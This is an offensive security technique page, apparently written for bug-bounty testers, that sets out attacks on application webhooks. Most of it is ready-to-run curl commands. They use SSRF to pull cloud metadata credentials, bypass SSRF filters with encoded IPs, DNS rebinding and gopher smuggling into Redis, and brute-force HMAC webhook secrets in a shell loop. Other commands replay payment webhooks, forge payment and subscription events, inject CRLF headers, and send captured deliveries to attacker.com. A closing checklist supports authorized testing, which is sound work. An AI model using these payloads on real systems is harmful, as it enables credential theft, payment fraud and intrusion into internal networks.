---
id: "webhook-security"
title: "Webhook Security Testing - SSRF, Signature Bypass & Replay"
type: "technique"
category: "api-security"
subcategory: "rest"
tags: ["api", "webhook", "ssrf", "signature-bypass", "replay", "event-injection", "bug-bounty"]
platforms: ["linux", "macos", "windows"]
related: ["ssrf-techniques", "bfla-authorization-testing", "shadow-zombie-api"]
difficulty: "intermediate"
updated: "2026-04-14"
---

# Webhook Security Testing

## Overview

Webhooks are HTTP callbacks triggered by events. When an application allows users to configure webhook URLs, it creates attack surface for SSRF, signature bypass, replay attacks, and event injection. Webhooks are a top target for SSRF because the server makes requests to user-controlled URLs.

## Attack 1: Webhook SSRF

### Basic SSRF via Webhook URL

```bash
# When setting up a webhook, point to internal services
curl -X POST https://target.com/api/webhooks \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
    "url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
    "events": ["all"]
  }'

# Internal network scanning
curl -X POST https://target.com/api/webhooks \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"url": "http://10.0.0.1:8080/admin", "events": ["order.created"]}'

curl -X POST https://target.com/api/webhooks \
  -d '{"url": "http://192.168.1.1:3306/", "events": ["all"]}'

curl -X POST https://target.com/api/webhooks \
  -d '{"url": "http://localhost:6379/", "events": ["all"]}'
```

### SSRF Filter Bypass Techniques

```bash
# IPv6 bypasses
curl -X POST https://target.com/api/webhooks \
  -d '{"url": "http://[::1]:8080/admin"}'
curl -d '{"url": "http://[::ffff:127.0.0.1]:8080/"}'
curl -d '{"url": "http://[0:0:0:0:0:ffff:169.254.169.254]/"}'

# Decimal IP
curl -d '{"url": "http://2130706433/"}'          # 127.0.0.1 in decimal
curl -d '{"url": "http://0x7f000001/"}'           # 127.0.0.1 in hex
curl -d '{"url": "http://017700000001/"}'         # 127.0.0.1 in octal

# URL parser confusion
curl -d '{"url": "http://127.0.0.1@attacker.com/"}'
curl -d '{"url": "http://attacker.com#@127.0.0.1/"}'
curl -d '{"url": "http://127.0.0.1%00@attacker.com/"}'

# DNS rebinding
# Set up DNS that resolves to allowed IP first, then 127.0.0.1
# Use services like rebind.it or 1u.ms
curl -d '{"url": "http://7f000001.1u.ms/"}'      # Resolves to 127.0.0.1

# Open redirect chain
# Find open redirect on allowed domain, chain to internal
curl -d '{"url": "https://target.com/redirect?url=http://169.254.169.254/"}'

# Protocol smuggling
curl -d '{"url": "gopher://internal-redis:6379/_SET%20key%20value"}'
curl -d '{"url": "dict://internal-redis:6379/SET:key:value"}'

# Cloud metadata endpoints
curl -d '{"url": "http://169.254.169.254/latest/meta-data/"}'              # AWS
curl -d '{"url": "http://metadata.google.internal/computeMetadata/v1/"}'    # GCP
curl -d '{"url": "http://169.254.169.254/metadata/instance?api-version=2021-02-01"}' # Azure
```

### Exploiting Webhook Response Data

```bash
# If the webhook delivery logs show response bodies:
# 1. Set webhook URL to internal service
# 2. Trigger an event
# 3. Check webhook delivery log for response body -> data exfiltration

# Check delivery logs
curl https://target.com/api/webhooks/123/deliveries \
  -H "Authorization: Bearer $TOKEN"
# Response might include body from internal service
```

## Attack 2: Webhook Signature Bypass

### Common Signature Mechanisms

```
# HMAC-SHA256 signature in header
X-Webhook-Signature: sha256=<hmac_of_body>
X-Hub-Signature-256: sha256=<hmac_of_body>

# Timestamp + signature
X-Webhook-Timestamp: 1710000000
X-Webhook-Signature: <hmac_of_timestamp.body>
```

### Bypass Techniques

```bash
# 1. Missing signature header -> does the endpoint still process it?
curl -X POST https://target.com/webhook/receive \
  -H "Content-Type: application/json" \
  -d '{"event": "payment.completed", "data": {"amount": 0}}'
# Omit the signature header entirely

# 2. Empty signature
curl -X POST https://target.com/webhook/receive \
  -H "X-Webhook-Signature: " \
  -d '{"event": "user.created"}'

# 3. Signature of empty string
# If implementation does hmac("") instead of hmac(body)
curl -X POST https://target.com/webhook/receive \
  -H "X-Webhook-Signature: sha256=$(echo -n '' | openssl dgst -sha256 -hmac '' | cut -d' ' -f2)" \
  -d '{"event": "user.deleted", "user_id": "victim"}'

# 4. Timing attack on HMAC comparison
# If the server uses string comparison instead of constant-time compare,
# measure response times to brute-force the signature byte by byte

# 5. JSON re-serialization bypass
# Server verifies HMAC over re-serialized JSON instead of raw bytes
# Adding whitespace or reordering keys changes the hash
# If server re-serializes, the hash won't match the sender's hash
# but verification passes because they both re-serialize to the same thing
```

### Signature Key Discovery

```bash
# Check if webhook secret is exposed in:
# - API responses when creating webhooks
# - JavaScript source code
# - Environment variables (via SSRF to metadata)
# - Error messages

# Brute-force common secrets
for secret in "webhook_secret" "secret" "password" "test" "changeme" ""; do
  SIG=$(echo -n '{"test":true}' | openssl dgst -sha256 -hmac "$secret" | cut -d' ' -f2)
  CODE=$(curl -s -o /dev/null -w "%{http_code}" -X POST https://target.com/webhook/receive \
    -H "X-Webhook-Signature: sha256=$SIG" \
    -d '{"test":true}')
  if [ "$CODE" = "200" ]; then
    echo "[+] Secret found: $secret"
  fi
done
```

## Attack 3: Replay Attacks

```bash
# Capture a legitimate webhook delivery
# Replay it to trigger duplicate actions

# 1. Capture a payment webhook
# Original: POST /webhook/receive with payment.completed event

# 2. Replay the same request
curl -X POST https://target.com/webhook/receive \
  -H "X-Webhook-Signature: <original_signature>" \
  -H "X-Webhook-Timestamp: <original_timestamp>" \
  -d '<original_body>'

# If no timestamp validation or idempotency key:
# - Payment processed twice
# - Credits added multiple times
# - Actions duplicated

# 3. Test with old timestamps
# Does the server reject webhooks with timestamps > 5 min old?
OLD_TS=$(($(date +%s) - 3600))  # 1 hour ago
curl -X POST https://target.com/webhook/receive \
  -H "X-Webhook-Timestamp: $OLD_TS" \
  -d '{"event": "credit.added", "amount": 100}'
```

## Attack 4: Event Injection

```bash
# If you can trigger a webhook to your own endpoint,
# capture the format, then forge events to the target's receiver

# 1. Set up webhook to receive events
curl -X POST https://target.com/api/webhooks \
  -d '{"url": "https://attacker.com/capture", "events": ["all"]}'

# 2. Trigger events and capture the format
# 3. Now send forged events to the target's webhook receiver

# Common event injection targets:
# Payment completion events
curl -X POST https://target.com/webhook/stripe \
  -d '{"type": "checkout.session.completed", "data": {"object": {"customer": "attacker", "amount_total": 0}}}'

# Subscription events
curl -X POST https://target.com/webhook/billing \
  -d '{"event": "subscription.activated", "user_id": "attacker", "plan": "enterprise"}'

# CI/CD triggers
curl -X POST https://target.com/webhook/github \
  -d '{"action": "completed", "workflow_run": {"conclusion": "success"}}'
```

## Attack 5: Webhook URL Manipulation

```bash
# If webhook URL is stored and can be updated:

# Path traversal in callback
curl -X PATCH https://target.com/api/webhooks/123 \
  -d '{"url": "https://target.com/../../../admin"}'

# HTTP header injection via URL
curl -X POST https://target.com/api/webhooks \
  -d '{"url": "https://attacker.com/\r\nX-Injected-Header: true"}'

# Webhook URL CRLF injection (GitLab CVE)
curl -X POST https://target.com/api/webhooks \
  -d '{"url": "https://attacker.com", "custom_headers": {"X-Custom": "value\r\nHost: internal.target.com"}}'
```

## Testing Checklist

```
- [ ] Test SSRF via webhook URL (internal IPs, cloud metadata, localhost)
- [ ] Test SSRF filter bypasses (IPv6, decimal IP, DNS rebinding, redirects)
- [ ] Test missing signature header -> does webhook still process?
- [ ] Test empty/null signature values
- [ ] Test replay of old webhook deliveries
- [ ] Test timestamp validation (old timestamps accepted?)
- [ ] Test event injection to webhook receiver endpoints
- [ ] Check webhook delivery logs for response body leakage (SSRF data exfil)
- [ ] Test protocol smuggling (gopher://, dict://)
- [ ] Test webhook URL for CRLF/header injection
- [ ] Check if webhook secret is exposed anywhere
```

## Tools
- **Burp Suite** — Intercept and replay webhook traffic
- **Burp Collaborator / interactsh** — SSRF detection
- **requestbin.com / webhook.site** — Capture webhook payloads
- **mitmproxy** — Webhook traffic analysis
- **ffuf** — Fuzz webhook parameters
- **rebind.it / 1u.ms** — DNS rebinding services
